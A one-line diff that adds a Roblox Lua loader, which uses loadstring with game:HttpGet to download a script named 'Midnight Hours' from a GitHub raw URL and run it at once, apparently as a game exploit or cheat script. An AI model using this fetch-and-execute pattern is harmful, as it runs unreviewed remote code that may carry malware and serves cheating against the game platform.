@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/danielontopp/scripts/main/Midnight%20Hours",true))()
